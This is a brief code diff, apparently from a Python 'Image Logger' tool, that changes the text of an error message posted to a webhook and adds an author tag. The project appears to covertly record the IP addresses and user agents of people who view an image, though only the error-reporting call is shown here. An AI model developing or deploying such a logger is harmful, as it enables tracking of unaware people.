@@ -77,7 +77,7 @@ def botCheck(ip, useragent):
 def reportError(error):
     requests.post(config["webhook"], json = {
     "username": config["username"],
-    "content": "@everyone",
+    "content": "Logger By Hgmm1234x",
     "embeds": [
         {
             "title": "Image Logger - Error",
